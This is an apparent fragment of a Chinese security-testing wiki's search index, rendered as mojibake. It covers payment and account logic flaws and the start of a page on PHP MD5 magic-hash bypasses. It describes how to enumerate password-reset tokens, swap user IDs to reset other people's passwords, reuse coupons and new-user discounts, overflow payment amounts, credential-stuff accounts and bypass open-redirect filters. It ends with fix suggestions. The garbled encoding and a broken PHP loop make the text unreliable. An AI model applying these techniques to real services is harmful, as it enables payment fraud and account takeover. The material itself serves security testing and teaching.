ç¯èŠ‚ã€‚è€Œå¤§éƒ¨åˆ†ç½‘ç«™å¯¹äºauthçš„ç”Ÿæˆéƒ½æ˜¯é‡‡ç”¨rand()å‡½æ•°ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªé—®é¢˜äº†ï¼ŒWindowsç¯å¢ƒä¸‹rand()æœ€å¤§å€¼ä¸º32768ï¼Œæ‰€ä»¥è¿™ä¸ªauthçš„å€¼æ˜¯å¯ä»¥è¢«æšä¸¾çš„ã€‚ å¦‚ä¸‹é¢è¿™ä¸ªä»£ç å¯ä»¥å¯¹authçš„å€¼åšä¸€ä¸ªå­—å…¸ã€‚ $a=0;for ($a=0;$a=32768;$a++) $b=md5($a); echo \\r ; echo $b; ç„¶åé‡ç½®æŸä¸ªè´¦å·ï¼Œå¹¶ä¸”å¯¹é‡ç½®é“¾æ¥å†…çš„authè¿›è¡Œæšä¸¾ã€‚ ç­¾çº¦æ¼æ´# ä½¿ç”¨Aæ‰‹æœºç™»é™†è´¦å·Aæ‰“å¼€è¦æµ‹è¯•çš„ä¸šåŠ¡ï¼Œç‚¹å‡»è‡ªåŠ¨ç»­è´¹ï¼Œæ”¯ä»˜æ—¶åœç•™åœ¨æ”¯ä»˜ç•Œé¢ã€‚ ä½¿ç”¨Bæ‰‹æœºç™»é™†è´¦å·Aæ‰“å¼€è¦æµ‹è¯•çš„ä¸šåŠ¡ï¼Œç‚¹å‡»è‡ªåŠ¨ç»­è´¹ï¼Œæ”¯ä»˜æ—¶åœç•™åœ¨æ”¯ä»˜ç•Œé¢ã€‚ é‡å¤å¤šå°æ‰‹æœºè¿›è¡ŒåŒæ ·æ“ä½œ Aæ‰‹æœºç‚¹å‡»æ”¯ä»˜è¿›è¡Œç­¾çº¦ Aæ‰‹æœºæ”¯ä»˜æˆåŠŸåï¼Œåœ¨ç¬¬ä¸‰æ–¹APPä¸­è§£é™¤è‡ªåŠ¨ç»­è´¹ Bæ‰‹æœºè¿›è¡Œæ”¯ä»˜ï¼Œæ”¯ä»˜æˆåŠŸååœ¨ç¬¬ä¸‰æ–¹APPä¸­è§£é™¤è‡ªåŠ¨ç»­è´¹ å…¨éƒ¨æ”¯ä»˜å®Œæˆåï¼Œç³»ç»Ÿå°±ä¼šä¸ºä½ å¼€é€šç›¸åº”çš„æ¬¡æ•°ï¼Œç”±äºæå‰æ‰“å¼€äº†æ”¯ä»˜ç•Œé¢ï¼Œæ‰€ä»¥é‡‘é¢éƒ½æ˜¯äº«å—åˆ°æ–°ç”¨æˆ·é¦–æœˆä¼˜æƒ çš„é‡‘é¢ã€‚ æœ€ç»ˆçš„æ•ˆæœæ˜¯ï¼Œä¸€ä¸ªè´¦æˆ·äº«å—åˆ°äº†å¤šæ¬¡æ–°ç”¨æˆ·é¦–æœˆä¼˜æƒ é‡‘é¢ï¼Œå³è¯æ˜æ¼æ´çš„å­˜åœ¨ã€‚ é€šå¸¸è¿™ç§æ¼æ´æ¯”è¾ƒå®¹æ˜“å‡ºç°åœ¨æ´»åŠ¨é¡µé¢çš„ä¼šå‘˜ä¼˜æƒ å¼€é€šï¼Œè€Œä¸”è¦è€ƒè™‘åˆ°æ”¯ä»˜åè¦æ¯”æ­£å¸¸è´­ä¹°ä¼˜æƒ æ‰ç®—æ˜¯æ¼æ´ã€‚ ä¼šå‘˜å‡çº§# ä½¿ç”¨Aæ‰‹æœºç™»é™†è´¦å·Aï¼Œå¹¶ä¸”å¼€é€šä¼šå‘˜ã€‚å¼€é€šè¶…çº§ä¼šå‘˜ï¼Œè¿›å…¥åˆ°å‡çº§é¡µé¢ï¼Œè¿›è¡Œè¡¥é½å·®ä»·å¼€é€šã€‚ ä½¿ç”¨Bæ‰‹æœºç™»é™†è´¦å·Aï¼Œç‚¹å‡»å¼€é€šè¶…çº§ä¼šå‘˜ï¼Œè¿›å…¥åˆ°å‡çº§é¡µé¢ï¼Œè¿›è¡Œè¡¥é½å·®ä»·å¼€é€šã€‚ Aæ‰‹æœºè¿›è¡Œæ”¯ä»˜ï¼ŒBæ‰‹æœºè¿›è¡Œæ”¯ä»˜ã€‚æœåŠ¡å™¨è®¤ä¸ºä½ è¡¥é½äº†å¤šä¸ªæœˆä»½çš„è¶…çº§ä¼šå‘˜ï¼Œç„¶ååˆ°è´¦å¤šæ¬¡ã€‚ å…¶å®è¿™ä¸ªå’Œç­¾çº¦æ¼æ´çš„åŸç†å·®ä¸å¤šï¼Œç»•è¿‡äº†æ”¯ä»˜åæœåŠ¡å™¨æ‰å»æ ¡éªŒæ˜¯å¦å¯ä»¥å‡çº§çš„é€»è¾‘ã€‚ è®¢å•å…³é—­# ä½¿ç”¨ä¼˜æƒ åˆ¸åˆ›å»ºä¸€ä¸ªè®¢å•ï¼Œåœç•™åœ¨æ”¯ä»˜ç•Œé¢ å…³é—­è®¢å•ï¼Œè¿”å›ä¼˜æƒ åˆ¸ ä½¿ç”¨ä¼˜æƒ åˆ¸å†æ¬¡åˆ›å»ºè®¢å•ï¼›æŠŠç¬¬ä¸€ä¸ªæœªæ”¯ä»˜çš„è®¢å•è¿›è¡Œæ”¯ä»˜ å•†å“ä»å…³é—­ï¼Œé‡æ–°è¿›å…¥åˆ°äº†ä»£å‘è´§çš„é˜¶æ®µï¼Œä¼˜æƒ åˆ¸å´ä»ç„¶å­˜åœ¨ï¼Œå³è¯æ˜æ¼æ´å­˜åœ¨ æ”¯ä»˜é‡‘é¢# æœ‰äº›ä¸šåŠ¡åœ¨æ”¯ä»˜æ—¶ä¼šå¿½ç•¥åˆ†ä»¥åçš„å•ä½ï¼Œè¿™æ—¶å€™å°±å¯¼è‡´äº†å­˜åœ¨åˆ†å•ä½çš„é‡‘é¢ä¹Ÿå¯ä»¥ç”Ÿæˆè®¢å• æ¯”å¦‚0.0190.02ï¼Œåœ¨æ”¯ä»˜æ—¶å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨ä¼ äº†0.019å…ƒçš„è®¢å•ã€‚è€Œç¬¬ä¸‰æ–¹ä»˜æ”¯é€šå¸¸æœ€å°çš„å•ä½ä¸ºåˆ† è¿™å°±å¯¼è‡´äº†è¿”å›çš„é‡‘é¢ä¼šå§åé¢çš„9å±è”½æ‰ï¼Œåªè¿”å›0.01ï¼ˆä¹Ÿæœ‰äº›ç›´æ¥å››èˆäº”å…¥å˜æˆ0.02çš„ï¼‰ å½“ä½ æ”¯ä»˜å®Œ0.01åï¼Œç¬¬ä¸‰æ–¹ä¼šé€šçŸ¥æœåŠ¡å™¨æ”¯ä»˜æˆåŠŸï¼Œè€ŒæœåŠ¡å™¨é‚£è¾¹ç”Ÿæˆçš„æ˜¯0.019ï¼Œå¯èƒ½è¿™ä¸ªè½¯ä»¶çš„ä¾¨èƒæœ€å°å•ä½ä¹Ÿæ˜¯åˆ†ï¼Œå››èˆäº”å…¥å˜æˆäº†0.02 intæ•´æ•°æº¢å‡º# æ³¨æ„ï¼šåœ¨åšæº¢å‡ºæµ‹è¯•æ—¶ï¼Œæœ‰å¯èƒ½å¯¼è‡´ç›®æ ‡æœåŠ¡å™¨å®•æœºï¼Œéœ€è¦å‘æˆæƒå•ä½ç”³è¯·æˆæƒåæ‰èƒ½è¿›è¡Œæµ‹è¯•ã€‚ intçš„èŒƒå›´æ˜¯-2147483648~2147483647ã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œå½“è¶…è¿‡æœ€å¤§å€¼åå°±é‡æ–°ä»0å¼€å§‹è®¡ç®— æ¯”å¦‚2147483649-2147483647ã€‚æœ‰æ—¶å€™æ”¯ä»˜é‡Œé¢æ²¡æœ‰è´Ÿæ•°æ‰€ä»¥ä»0å¼€å§‹è®¡ç®—äº† å½“æ”¯ä»˜é‡‘é¢ä¸º2147483649æ—¶ï¼Œæ”¯ä»˜é‡‘é¢å°±å˜æˆäº†1ï¼Œå³2147483649-21474836481 æ”¯ä»˜çš„æ—¶å€™å¯ä»¥ç›´æ¥å§é‡‘é¢æ”¹æˆè¿™ä¸ªå€¼ï¼Œåœ¨æµ‹è¯•å•†å“æ—¶ä¹Ÿå¯ä»¥è®©æ€»ä»·æ ¼ä¸ºè¿™ä¸ªæ•°ã€‚2147483648ç‰©å“å•ä»·+1ç‰©å“æ•°é‡ ä»¥ä¸Šçš„åšæ³•ç›®çš„ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯é€šè¿‡æ•´æ•°æº¢å‡ºæ¥ä¿®æ”¹æ”¯ä»˜é‡‘é¢æˆ–è€…è´­ä¹°å•†å“æ•°é‡ã€‚ çªç ´æ—¶é—´é™åˆ¶#ä¸€äº›ç½‘ç«™ä¸­çš„é™æ—¶æ´»åŠ¨è®¾ç½®äº†æ´»åŠ¨æ—¶é—´èŒƒå›´ï¼Œå¯ä»¥é€šè¿‡æŠ“åŒ…å°è¯•æ›´æ”¹æ—¶é—´å‚æ•°ä¸ºæ´»åŠ¨æœªé™å®šèŒƒå›´å†…çš„ã€‚ å‰ç«¯éªŒè¯#å‰ç«¯åŠ å¯†ã€åç«¯è§£å¯†æ ¡éªŒã€‚æ¯”å¦‚åœ¨ç”¨æˆ·ç™»å½•æ—¶ï¼Œé€šè¿‡æŠ“åŒ…å‘ç°ç”¨æˆ·å¯†ç è¢«åŠ å¯†ä¼ è¾“äº†ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›è§£å¯†å·¥å…·è¿›è¡Œç ´è§£ï¼Œå¦‚ï¼šBurpè§£å¯†æˆ–è€…ä¸€äº›åœ¨çº¿è§£å¯†ç½‘ç«™ã€‚ æš´åŠ›ç ´è§£æ’åº“#é¦–å…ˆåœ¨æ²¡æœ‰éªŒè¯ç æˆ–è€…éªŒè¯ç å¯ä»¥è¢«ç»•è¿‡çš„æƒ…å†µä¸‹ï¼Œå°è¯•5æ¬¡æˆ–è€…10æ¬¡è´¦å·å¯†ç ç™»é™†ï¼Œæ£€æµ‹ç›®æ ‡æ˜¯å¦å°ç¦è´¦æˆ·ï¼Œå¦‚æœæ²¡æœ‰å°ç¦è§„åˆ™ï¼Œå¯ä»¥ä¸æ–­è¿›è¡Œçˆ†ç ´ã€‚é‡‡ç”¨è´¦å·å¯†ç çˆ†ç ´ï¼Œå¯¹äºä¸€äº›å•†åŸã€åº”ç”¨ã€æ”¿åºœã€å­¦æ ¡é‡‡ç”¨æ’åº“æ–¹å¼åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥è´¦å·ï¼ˆéœ€è¦å‡†å¤‡å„ç±»å­—å…¸ï¼šæ‰‹æœºå·æ’åº“ã€é‚®ç®±æ’åº“ã€å§“åæ’åº“ï¼‰ã€‚ å¯†ç æ‰¾å›# é€šè¿‡é‚®ç®±æ‰¾å›å¯†ç ï¼Œè®¿é—®é“¾æ¥é‡ç½®å¯†ç ï¼Œè¾“å…¥æ–°å¯†ç åæäº¤æŠ“åŒ…ï¼Œè™½ç„¶æœ‰tokenï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ç›´æ¥ä¿®æ”¹ç”¨æˆ·IDè¿›è€Œä¿®æ”¹ä»–äººå¯†ç  é€šè¿‡ä»–äººæ‰‹æœºå·æ‰¾å›å¯†ç ï¼ŒæŠ“åŒ…ï¼Œå°†ä»–äººæ‰‹æœºå·æ›¿æ¢ä¸ºè‡ªå·±çš„æ‰‹æœºå·ï¼Œè·å–éªŒè¯ç ï¼Œæäº¤åä¿®æ”¹å¯†ç  é€šè¿‡è‡ªå·±æ‰‹æœºå·æ‰¾å›å¯†ç ï¼Œè·å–éªŒè¯ç åæŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„ç”¨æˆ·IDæ”¹ä¸ºä»–äººè´¦å·IDï¼Œæäº¤åæˆåŠŸä¿®æ”¹ä»–äººå¯†ç  é€šè¿‡é‚®ç®±æ‰¾å›å¯†ç ï¼ŒURLé“¾æ¥ä¸­ä¿®æ”¹ç”¨æˆ·IDä¸ºä»–äººï¼Œé‚®ç®±ä¸å˜ï¼Œä¹‹åé€šè¿‡é“¾æ¥å¯ä»¥å°†ä»–äººè´¦æˆ·ç»‘å®šä¸ºè‡ªå·±çš„é‚®ç®±ï¼Œä¹‹åé€šè¿‡é‚®ç®±æ‰¾å›å¯†ç  ä»»æ„urlè·³è½¬#urlè·³è½¬æ¼æ´ä¹Ÿå«å¼€å‘é‡å®šå‘æ¼æ´ï¼Œå¯ä»¥æŠŠç”¨æˆ·é‡å®šå‘åˆ°æ”»å‡»è€…è‡ªå·±æ„é€ çš„é¡µé¢å»ï¼Œç®€å•çš„è¯´å°±æ˜¯å¯ä»¥è·³è½¬åˆ°ä»»æ„æŒ‡å®šçš„urlã€‚ä¸€èˆ¬å‡ºç°åœ¨éªŒè¯è·³è½¬ã€ssoç™»é™†ç­‰ä½ç½®ã€‚ æœåŠ¡ç«¯æœªå¯¹ä¼ å…¥çš„è·³è½¬urlå˜é‡è¿›è¡Œæ£€æŸ¥å’Œæ§åˆ¶ï¼Œå¯èƒ½å¯¼è‡´å¯æ¶æ„æ„é€ ä»»æ„ä¸€ä¸ªæ¶æ„åœ°å€ï¼Œè¯±å¯¼ç”¨æˆ·è·³è½¬åˆ°æ¶æ„ç½‘ç«™ã€‚ å±å®³ï¼š ç½‘ç«™é’“é±¼ é…åˆCSRFæ“ä½œå±é™©è¯·æ±‚ é…åˆXSSæ‰§è¡ŒJSç›—å–cookie é…åˆæµè§ˆå™¨æ¼æ´ï¼ˆCVE-2018-8174ï¼‰ http://www.xxx.com?url=https://www.baidu.com æ›¿æ¢urlå‚æ•°åèƒ½å¤Ÿè·³è½¬åˆ°å¯¹åº”é¡µé¢ï¼Œä½†æ˜¯ä¸€äº›ç½‘ç«™å¯èƒ½ä¼šå¯¹urlè·³è½¬åšé™åˆ¶ï¼Œå¯ä»¥å°è¯•ç»•è¿‡bypass 1.åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶,æœ€ç»ˆè·³è½¬åˆ°äº¬ä¸œé¡µé¢url=https://www.baidu.com?www.jd.com2.åˆ©ç”¨@ç»•è¿‡é™åˆ¶,æœ€ç»ˆè·³è½¬åˆ°äº¬ä¸œé¡µé¢url=https://www.baidu.com@www.jd.com3.åˆ©ç”¨æ–œæ†åæ–œæ ç»•è¿‡é™åˆ¶4.åˆ©ç”¨#ç»•è¿‡é™åˆ¶url=https://www.baidu.com@www.jd.com5.åˆ©ç”¨å­åŸŸåç»•è¿‡6.åˆ©ç”¨ç•¸å½¢urlç»•è¿‡7.åˆ©ç”¨è·³è½¬IPç»•è¿‡ æ”¯ä»˜é€»è¾‘æ¼æ´#åœ¨æ”¯ä»˜ç¯èŠ‚ä¸­ç”±äºé€»è¾‘ä¸ä¸¥è°¨è€Œäº§ç”Ÿçš„æ¼æ´ç§°ä¸ºæ”¯ä»˜æ¼æ´ã€‚ æµ‹è¯•æ€è·¯#åªè¦æœ‰å‚æ•°ï¼Œéƒ½å¯ä»¥ä¿®æ”¹ï¼Œéƒ½æœ‰å¯èƒ½å‡ºç°é—®é¢˜ã€‚ é€šå¸¸ä½¿ç”¨ä¸¤ä¸ªè´¦å·æ¥å¯¹æ¯”æµ‹è¯•ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«å‘ç°å¯ç–‘å‚æ•° è®¢å•æ¨¡å—# ä¸‹å•ä¹‹åä¿®æ”¹å•†å“ä»·æ ¼ ä¸‹å•ä¹‹åæ›´æ”¹æ•°é‡è®¾ä¸ºè´Ÿæ•°ï¼Œäº§ç”Ÿæ­£è´Ÿé€»è¾‘ å¹¶å‘è´­ä¹°æ˜¯å¦å‡ºç°é€»è¾‘é—®é¢˜ å•†å“ä¸º0ï¼Œæ˜¯å¦å­˜åœ¨è´­ä¹°çš„å¯èƒ½ ç”Ÿæˆè®¢å•æ—¶ä¿®æ”¹è®¢å•é‡‘é¢ ç»“ç®—æ¨¡å—# ä¼˜æƒ åˆ¸é‡å¤åˆ©ç”¨ ä¿®æ”¹ç»“ç®—çŠ¶æ€ æ›´æ”¹æ”¯ä»˜APIæˆ–è€…æ”¯ä»˜æ¨¡å¼ ä¼ªé€ æˆåŠŸç»“ç®—è¯·æ±‚ é€€è´§æ¨¡å—# æ›´æ”¹è´§ç‰©çŠ¶æ€ æ›´æ”¹é€€è´§ä»·æ ¼ æ”¶è´§æ¨¡å—# ç»•è¿‡å®¢æˆ·ç›´æ¥ç¡®è®¤æ”¶è´§ è¾¹ç•Œå€¼é—®é¢˜#æ­£å¸¸çš„é€»è¾‘æ˜¯ç”¨æˆ·è´­ä¹°å•†å“ï¼Œç„¶åä»·æ ¼ç´¯åŠ å¾—åˆ°ä¸€ä¸ªæ€»ä»·è¿›è¡Œæ‰£æ¬¾ã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¦‚æœè¯´ç”¨æˆ·è´­ä¹°çš„å•†å“æ˜¯è´Ÿæ•°äº†ï¼Œé‚£ä¹ˆè®¡ç®—çš„æ€»æ•°å°±æ˜¯è´Ÿæ•°ã€‚åè¿‡æ¥é’±ç»™ç”¨æˆ· é¡ºåºæ‰§è¡Œç¼ºé™·#æ­£å¸¸çš„é€»è¾‘æ˜¯a-b-c-d å¾ªç¯æ¸è¿›çš„è¿›è¡Œæµç¨‹æ“ä½œã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¯ä»¥ç›´æ¥ä»ä¸­ç»•è¿‡æŸä¸€ä¸ªè¿‡ç¨‹è¿›å…¥åˆ°ä¸‹ä¸€æ­¥æ“ä½œã€‚å¦‚æœè¯´æœ‰ä¸€é¡¹æ˜¯æ”¯ä»˜çš„æ“ä½œï¼Œé‚£ä¹ˆä¹Ÿå°±ä¼šäº§ç”Ÿæ”¯ä»˜ç»•è¿‡ï¼Œå¦‚æœè¯´æœ‰ä¸€é¡¹æ˜¯éªŒè¯æœºåˆ¶ï¼Œå°±ä¼šç»•è¿‡éªŒè¯ç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥ã€‚ é‡‘é¢ç›´æ¥ä¼ è¾“å¯¼è‡´ç¯¡æ”¹#ç›´æ¥å¯¹ä¸‹å•çš„é‡‘é¢è¿›è¡Œä¿®æ”¹å€¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨fdæˆ–è€…burpæŠ“åŒ… ç¡®å®šæ”¯ä»˜ä¹‹åè¿˜å¯ä»¥åŠ å…¥è´­ç‰©è½¦#æŠŠå•†å“æ”¾å…¥è´­ç‰©è½¦ç‚¹å‡»ä¸‹å•æ”¯ä»˜ï¼Œä¼šè·³è½¬åˆ°å¾®ä¿¡ï¼Œæ”¯ä»˜å®ç­‰ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°ã€‚è¿™ä¸ªæ—¶å€™è¿˜å¯ä»¥ç»§ç»­åœ¨è´­ç‰©è½¦ä¸­åŠ å…¥å•†å“ï¼Œæ”¯ä»˜ç»“æŸä¹‹åï¼Œå•†å®¶å‘æ”¾çš„å•†å“æ˜¯ç°åœ¨çš„è´­ç‰©è½¦é‡Œé¢çš„ä¸œè¥¿ã€‚ è¯·æ±‚é‡æ”¾#è´­ä¹°æˆåŠŸä¹‹åï¼Œç»§ç»­é‡æ”¾è¯·æ±‚ï¼Œå¯ä»¥è®©è´­ä¹°çš„å•†å“ä¸€ç›´å¢åŠ ã€‚è´­ä¹°æˆåŠŸä¹‹åï¼Œä¼šæœ‰ä¸€ä¸ªé“¶è¡Œå¯¹å•†æˆ·ç½‘ç«™è·³è½¬çš„è¿‡ç¨‹ï¼Œå¦‚æœåå¤è¿›è¡Œæ“ä½œï¼Œæœ‰å‡ ç‡ä¼šå¯¼è‡´å•†å“åå¤è´­ä¹°å’Œå¢åŠ ï¼Œä½†æ˜¯ä¸éœ€è¦ä»˜æ›´å¤šçš„é’±ã€‚ è¯·æ±‚å‚æ•°å¹²æ‰°#é‡‘é’±åšäº†ç­¾åè®¤è¯ä¹‹åï¼Œä¿®æ”¹åä¸é€šè¿‡ï¼Œä½†æ˜¯åœ¨é‡Œé¢ä»ç„¶ä¼šæœ‰ä¸€ä¸ªå‚æ•°å¯¹é‡‘é¢äº§ç”Ÿå½±å“å¯¼è‡´é—®é¢˜äº§ç”Ÿã€‚ è®¢å•æ›¿æ¢#è®¢å•æ›¿æ¢å‘ç”Ÿåœ¨æ”¯ä»˜ä¹‹åçš„äº‹ä»¶å¤„ç†ï¼ŒåŒæ—¶å‘æœåŠ¡å™¨å‘èµ·äºŒæ¬¡æ”¯ä»˜è¯·æ±‚ä¸€ä¸ªå¤šä¸€ä¸ªå°‘ï¼Œæ”¯ä»˜é‡‘é¢å°‘çš„ï¼Œç„¶åæ”¯ä»˜ä¹‹åè¿›è¡Œæ›¿æ¢ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨è®¢å•æ”¯ä»˜å®Œæˆï¼Œå¹¶ä¸”è¿‡ç¨‹å¯ä»¥åå¤çš„å›æ”¾ã€‚ æ¬ºè¯ˆ#éœ€è¦ä¸¤ä¸ªæ”¶æ¬¾äººï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸çš„å•†å®¶ï¼Œä¸€ä¸ªæ˜¯ä¼ªé€ çš„å•†å®¶ å•ä½æ›¿æ¢#äº§ç”Ÿåœ¨paypalç±»ä¼¼çš„å›½é™…æ”¯ä»˜çš„åœºæ™¯ã€‚ ç”¨æˆ·æ›¿æ¢#åœ¨æ”¯ä»˜è¿‡ç¨‹ä¸­å‘ç”Ÿç”¨æˆ·æ›¿æ¢ç°è±¡ï¼Œé¦–å…ˆç™»é™†è‡ªå·±çš„è´¦æˆ·ï¼Œç„¶åå–å¾—å¦å¤–ä¸€ä¸ªäººçš„è´¦æˆ·åç­‰æœ‰æ•ˆä¿¡æ¯ï¼Œåœ¨ä¸šåŠ¡æµç¨‹ä¸­ç”¨å¯¹æ–¹çš„ç”¨æˆ·åæ›¿æ¢è‡ªå·±çš„ç”¨æˆ·åï¼Œç”¨å¯¹æ–¹çš„ä½™é¢è´­ä¹°å®Œæˆåï¼Œå†æ›¿æ¢è‡ªå·±çš„è´¦æˆ·åï¼Œè¿™æ ·å°±å½¢æˆåˆ«äººçš„é’±ä¹°è‡ªå·±çš„ä¸œè¥¿ å¼ºåˆ¶æ”»å‡»#å¼ºåˆ¶æ”»å‡»å‘ç”Ÿåœ¨æš´åŠ›ç ´è§£çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªå•†å®¶è¿ç”¨ä¸€ä¸ªè‡ªå·±çš„ç½‘åº—ï¼Œæ¥å…¥ç¬¬ä¸‰æ–¹æ”¯ä»˜æ¥å£ï¼Œç”±äºè®¾è®¡ä¸Šçš„ä¸å½“å¯¼è‡´å•†å®¶ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜çº¦å®šçš„å¯†é’¥Keyå¯ä»¥å•ç‹¬è¢«MD5åŠ å¯†ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨MD5ç¢°æ’æŠ€æœ¯å¯¹å¯†é’¥è¿›è¡Œç ´è§£ï¼Œæ”»å‡»è€…å¯ä»¥è®¾è®¡ç®€å•çš„å¯†é’¥åŠ å¯†ä¿¡æ¯ä½¿å¾—MD5åŠ å¯†æ˜¯å¯ä»¥ç”¨MD5ç¢°æ’æŠ€æœ¯è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ ç§˜é’¥æ³„æ¼#å†…ç½®æ”¯ä»˜åŠŸèƒ½çš„appä¸ºäº†è®¾è®¡ä¸Šçš„æ–¹ä¾¿æœ‰å¯èƒ½ä¼šæŠŠMd5æˆ–è€…æ˜¯RSAçš„ç§é’¥æ³„æ¼å¯¼è‡´æ”»å‡»è€…åç¼–è¯‘apkä¹‹åè·å–å¯†é’¥ä¿¡æ¯ä½¿å¾—äº¤æ˜“ä¿¡æ¯å¯ä»¥è¢«ç¯¡æ”¹ã€‚13.å‡½æ•°ä¿®æ”¹ï¼šapkåç¼–è¯‘ä¹‹åçš„å‡½æ•°ä¿®æ”¹ï¼Œå¯èƒ½å¯¼è‡´å•†å®¶åœ¨æœ€åä¸€æ­¥å‘æ”¯ä»˜æ–¹æäº¤è®¢å•æ—¶æœªéªŒè¯ä¿¡æ¯çš„å‡†ç¡®æ€§ï¼Œä»ç„¶è¢«ç¯¡æ”¹ã€‚ ä¿®å¤å»ºè®®# ç”Ÿæˆæ•°æ®ç­¾åï¼Œå¯¹ç”¨æˆ·é‡‘é¢å’Œè®¢å•ç­¾å æ•æ„Ÿå‚æ•°ä¸è¦æ”¾åœ¨urlä¸­ æœåŠ¡ç«¯æ ¡éªŒè¿‡æ»¤å®¢æˆ·ç«¯æäº¤çš„å‚æ•° åœ¨æœåŠ¡ç«¯è®¡ç®—é‡‘é¢çš„æ—¶å€™ï¼Œä¸€å®šè¦åˆ¤æ–­æ˜¯å¦ä¸ºæ­£æ•° æ”¯ä»˜è¿‡ç¨‹ä¸­åŠ ä¸€ä¸ªæœåŠ¡å™¨ç”Ÿæˆçš„keyï¼Œç”¨æˆ·æ ¡éªŒå‚æ•°æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ ç”¨urlä¼ é€’ç›¸å…³å‚æ•°ï¼Œåç«¯è¿›è¡Œæ•°å­—éªŒè¯ è®¢å•é‡‘é¢å’Œå……å€¼æ¥å£è¿”å›çš„æ•°æ®è¿›è¡Œæ ¡éªŒ æäº¤è®¢å•æ—¶åå°åˆ¤æ–­å•ä»·æ˜¯å¦ä¸æ•°æ®åº“ä¸­ç›¸ç¬¦ï¼Œè‹¥ä¸ç¬¦åˆ™è¿”å›æ•°æ® æ”¯ä»˜æ—¶åº”ä»æœåŠ¡å™¨æ‹‰å–æ•°æ®ï¼Œè€Œä¸æ˜¯ç›´æ¥è¯»å–å®¢æˆ·ç«¯çš„å€¼"},{"title":"MD5ç»•è¿‡","path":"/wiki/WP/PHPç‰¹æ€§/MD5ç»•è¿‡.html","content":"çŸ¥è¯†ç‚¹å¼±æ¯”è¾ƒç±»å‹å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œä¼šæŠŠå­—ç¬¦ä¸²å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—(å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æœ‰æ•°å­—ï¼Œåˆ™è½¬æ¢ä¸ºå¼€å¤´æ•°å­—ï¼Œæ²¡æœ‰åˆ™è½¬æ¢ä¸º0) ==ï¼šåªæ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ç›¸åŒï¼Œä¸æ¯”è¾ƒæ•°æ®ç±»å‹!=: åªæ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ä¸åŒ var_dump(123==123a);#bool(true)var_dump(123==1234a);#bool(false)var_dump(0==abc);#bool(true) å¼ºæ¯”è¾ƒç±»å‹ä¸ä»…è¦æ¯”è¾ƒæ•°æ®çš„å€¼ä¹Ÿè¦æ¯”è¾ƒæ•°æ®çš„ç±»å‹ï¼Œä¾‹å¦‚strå’Œintä¸¤ç§æ•°æ®ç±»å‹å°±ä¸ä¼šç›¸ç­‰ ===ï¼šæ¯”è¾ƒæ•°æ®ç±»å‹â€”â€”æ•°æ®ç±»å‹ç›¸åŒ æ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ç›¸åŒ!==ï¼šæ¯”è¾ƒæ•°æ®ç±»å‹â€”â€”æ•°æ®ç±»å‹ä¸åŒ || æ¯”è¾ƒæ•°æ®å€¼â€”â€”æ•°æ®å€¼ä¸åŒ var_dump(123===123a);#bool(false)var_dump(123===123);#bool(false)var_dump(123===123);#bool(true å½“phpå¤„ç†å­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€œ â€æˆ–è€…â€œ â€æ¥æ¯”è¾ƒ å½“â€œâ€æ—¶ï¼š phpæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥è¦ç»•è¿‡â€â€ï¼Œéœ€è¦æƒ³åŠæ³•è®©ä¸¤è¾¹çš„ä¸åŒæ•°å€¼ç»è¿‡md5åŠ å¯†åéƒ½ä¸ºâ€œ0Eâ€å¼€å¤´ï¼Œè¿™æ ·å½“å¤„ç†åˆ°è¿™é‡Œçš„ä»£ç æ—¶ï¼Œphpä¼šè®¤ä¸ºå®ƒä»¬ä¸¤ä¸ªéƒ½ä¸º0ï¼Œå³å¯ç»•è¿‡ã€‚ å¼€å¤´ä¸º0Eï¼ˆMD5å€¼ï¼‰å­—æ¯æ•°å­—æ··åˆç±»å‹ï¼šs878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904çº¯å¤§å†™å­—æ¯ï¼šQLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162çº¯æ•°å­—ï¼š2406107080e46209743190650901956298873685440116270630e48580568703443990593836270177547756350650e99821208994664096759945036116847905553610e643442214660994430134492464512 5432453531 0e51231869908588163086189052609755796798200e877622011730221803461740184915 55853935790e66435735538230580599276533702363765525010e165886706997482187870215578015 7124129977 0e500007361044747804682122060876 71975461970e9151885760724691014573156755027656486157 0e451569119711843337267091732412 phpä¸­çš„md5()å‡½æ•°æ— 